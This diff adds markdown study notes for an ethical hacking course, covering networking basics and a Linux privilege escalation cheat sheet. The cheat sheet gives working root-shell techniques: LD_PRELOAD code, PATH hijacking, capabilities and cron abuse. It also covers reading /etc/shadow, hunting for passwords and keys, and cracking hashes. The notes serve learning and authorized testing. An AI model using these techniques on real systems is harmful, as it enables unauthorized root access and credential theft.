@@ -1,0 +1,164 @@
+# Practical Ethical Hacking
+
+### **Networking Refresher**
+
+- **IP Addresses**
+
+  - `ifconfig` - Displays IP address (Use `ip a` on newer Linux distros)
+  - **NAT (Network Address Translation)** - Assigns private IP addresses
+  - Classes of private IP addresses:
+
+- **MAC Addresses (Layer 2)**
+
+  - `ifconfig` - **ether** shows MAC address
+  - [First three pairs are vendor identifiers.](https://maclookup.app/)
+
+- **TCP, UDP, and the Three-Way Handshake (Layer 4)**
+
+  - **TCP (Transmission Control Protocol)** - Uses three-way handshake
+  - **UDP (User Datagram Protocol)** - Connectionless protocol
+  - **Three-Way Handshake**: SYN > SYN-ACK > ACK
+
+- **Common Ports and Protocols**
+
+  - **FTP (File Transfer Protocol)**: Port 21 (TCP)
+  - **SSH (Secure Shell)**: Port 22 (TCP)
+  - **Telnet**: Port 23 (TCP)
+  - **SMTP (Simple Mail Transfer Protocol)**: Port 25 (TCP)
+  - **HTTP (Hypertext Transfer Protocol)**: Port 80 (TCP)
+  - **HTTPS (Hypertext Transfer Protocol Secure)**: Port 443 (TCP)
+  - **POP3 (Post Office Protocol v3)**: Port 110 (TCP)
+  - **IMAP (Internet Message Access Protocol)**: Port 143 (TCP)
+  - **NTP (Network Time Protocol)**: Port 123 (UDP)
+  - **SMB (Server Message Block)**: Port 445 (TCP)
+  - **FTPS (FTP over SSL/TLS)**: Port 990 (TCP)
+  - **LDAP (Lightweight Directory Access Protocol)**: Port 389 (TCP and UDP)
+  - **MySQL**: Port 3306 (TCP)
+  - **DNS (Domain Name System)**: Port 53 (TCP and UDP)
+  - **DHCP (Dynamic Host Configuration Protocol)**: Port 67 (UDP) and Port 68 (UDP)
+  - **TFTP (Trivial File Transfer Protocol)**: Port 69 (UDP)
+  - **SNMP (Simple Network Management Protocol)**: Port 161 (UDP)
+
+### **Linux Privilege Escalation for Beginners**
+
+#### **Initial Enumeration**
+
+- **System Enumeration**
+  ```sh
+  uname -a
+  cat /proc/version
+  cat /etc/issue
+  lscpu
+  ps -aux | grep root
+  hostname
+  ```
+
+- **User Enumeration**
+  ```sh
+  whoami
+  id
+  sudo -l
+  cd /home/user && find . -type f -ls
+  cat /etc/passwd
+  cat /etc/shadow
+  cat /etc/group
+  history
+  sudo su -
+  ```
+
+- **Network Enumeration**
+  ```sh
+  ifconfig
+  ip a
+  ip route
+  route
+  arp -a
+  ip neigh
+  netstat -ano
+  ```
+
+- **Password Hunting**
+  ```sh
+  grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null
+  locate password | more
+  locate pass | more
+  locate pwd | more
+  find / -name authorized_keys 2> /dev/null
+  find / -name id_rsa 2> /dev/null
+  ```
+
+### **Escalation Paths**
+
+- **Kernel Exploits**: [Kernel Exploits Repo](https://github.com/lucyoa/kernel-exploits)
+
+- **Stored Passwords**
+  ```sh
+  history
+  cat .bash_history
+  find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
+  ```
+
+- **Weak File Permissions**
+  ```sh
+  unshadow passwd shadow
+  hashcat -m 1800 unshadow.txt rockyou.txt -O
+  ```
+
+- **Sudo Privilege Escalation**
+  - **Shell Escaping**: [GTFOBins](https://gtfobins.github.io/)
+  - **LD_PRELOAD Attack**:
+    ```c
+    #include <stdio.h>
+    #include <sys/types.h>
+    #include <stdlib.h>
+    #include <unistd.h>
+    void _init() {
+        unsetenv("LD_PRELOAD");
+        setgid(0);
+        setuid(0);
+        system("/bin/sh");
+    }
+    ```
+    ```sh
+    gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
+    sudo LD_PRELOAD=/tmp/shell.so apache2
+    ```
+
+- **SUID Escalation**
+  ```sh
+  find / -perm -u=s -type f 2>/dev/null
+  ```
+
+- **Environmental Variable Exploits**
+  ```sh
+  print $PATH
+  echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c
+  gcc /tmp/service.c -o /tmp/service
+  export PATH=/tmp:$PATH
+  <service>
+  ```
+
+- **Capabilities Exploits**
+  ```sh
+  getcap -r / 2>/dev/null
+  python -c 'import os; os.setuid(0); os.system("/bin/bash")'
+  ```
+
+- **Cron Job Exploits**
+  ```sh
+  cat /etc/crontab
+  echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > <script>
+  chmod +x <script>
+  ```
+
+- **NFS Root Squashing**
+  ```sh
+  cat /etc/exports
+  showmount -e <IP>
+  mkdir /tmp/mountme
+  mount -o rw,vers=2 <IP>:/tmp /tmp/mountme
+  ```
+
+- **Docker Escalation**: [GTFOBins Docker](https://gtfobins.github.io/gtfobins/docker/)
+
+This section integrates Linux privilege escalation techniques with practical commands and references to well-known exploits. Let me know if you need any refinements!
